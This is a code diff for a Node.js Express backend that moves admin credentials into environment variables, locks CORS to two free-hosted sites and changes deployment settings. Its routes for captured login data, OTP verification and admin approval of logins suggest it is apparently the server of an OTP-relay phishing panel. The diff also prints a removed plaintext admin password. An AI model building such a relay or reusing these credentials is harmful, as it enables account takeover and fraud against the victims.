@@ -1,9 +1,34 @@
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
+require('dotenv').config(); // Load environment variables from .env
 
 const app = express();
-const PORT = 3000;
+
+// ✅ Custom CORS setup
+const allowedOrigins = [
+  'https://ppan001.42web.io',
+  'https://wf001.42web.io',
+];
+
+app.use(cors({
+  origin: function(origin, callback) {
+    if (!origin) return callback(null, true); // Allow tools like Postman
+    if (allowedOrigins.indexOf(origin) === -1) {
+      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
+      return callback(new Error(msg), false);
+    }
+    return callback(null, true);
+  },
+  credentials: true,
+}));
+
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// ✅ Environment variables for credentials
+const ADMIN_USER = process.env.ADMIN_USER;
+const ADMIN_PASS = process.env.ADMIN_PASS;
 
 // Simple Basic Auth middleware
 const basicAuth = (req, res, next) => {
@@ -18,10 +43,6 @@ const basicAuth = (req, res, next) => {
   const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
   const [username, password] = credentials.split(':');
 
-  // TODO: Replace these with your desired admin username/password
-  const ADMIN_USER = 'goldfingaz';
-  const ADMIN_PASS = 'Miamia305';
-
   if (username === ADMIN_USER && password === ADMIN_PASS) {
     return next();
   } else {
@@ -29,10 +50,6 @@ const basicAuth = (req, res, next) => {
     return res.status(401).send('Invalid credentials.');
   }
 };
-
-app.use(cors());
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
 
 // State variables
 let loginData = null;
@@ -106,7 +123,7 @@ app.post('/verify-otp', (req, res) => {
 });
 
 /* ==============================
-   ADMIN ROUTES (protected by basicAuth)
+   ADMIN ROUTES (protected)
 ============================== */
 
 // Admin approves login
@@ -146,8 +163,11 @@ app.get('/get-login-data', basicAuth, (req, res) => {
 });
 
 /* ==============================
-   SERVER START
+   START SERVER
 ============================== */
-app.listen(PORT, '0.0.0.0', () => {
-  console.log(`✅ Server running at http://158.101.117.189:${PORT}`);
+
+const PORT = process.env.PORT || 3000;
+
+app.listen(PORT, () => {
+  console.log(`✅ Server running at https://my-node-backend-4nfy.onrender.com`);
 });
